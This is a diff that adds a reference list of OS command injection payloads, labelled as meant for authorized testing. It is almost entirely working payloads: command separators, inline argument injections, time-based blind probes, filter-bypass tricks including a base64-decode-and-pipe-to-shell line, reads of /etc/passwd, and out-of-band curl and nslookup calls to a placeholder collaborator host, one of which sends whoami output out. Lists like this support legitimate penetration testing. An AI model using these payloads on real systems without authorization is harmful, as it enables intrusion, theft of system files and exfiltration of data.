@@ -1,0 +1,51 @@
+# OS Command Injection — canonical payloads (authorized testing)
+# Full sets: ../vendor/PayloadsAllTheThings/Command Injection/  | automation: commix
+# Separators join your command onto theirs. Marker: `id` / `whoami` (harmless).
+
+## --- Separators ---
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+%0a id
+%0d%0a id
+
+## --- Inline / in arguments ---
+127.0.0.1; id
+127.0.0.1 | whoami
+127.0.0.1 && uname -a
+$(whoami)
+`whoami`
+;${IFS}id
+;cat${IFS}/etc/passwd
+
+## --- Blind (time-based) ---
+; sleep 5
+| sleep 5
+& ping -c 5 127.0.0.1 &
+$(sleep 5)
+;`sleep 5`
+%0asleep%205
+
+## --- Blind (OOB — DNS/HTTP to collaborator) ---
+; nslookup YOUR-COLLABORATOR
+| curl https://YOUR-COLLABORATOR/
+$(curl http://YOUR-COLLABORATOR/$(whoami))
+
+## --- Filter bypass ---
+;i''d
+;i\d
+;/bin/c'a't /etc/passwd
+;cat$IFS$9/etc/passwd
+;{cat,/etc/passwd}
+;echo$IFS$9cG93bg==|base64$IFS$9-d|sh          # decodes and executes (careful)
+
+## --- Windows ---
+& whoami
+| whoami
+&& systeminfo
+`powershell -c "whoami"`
+& ping -n 5 127.0.0.1
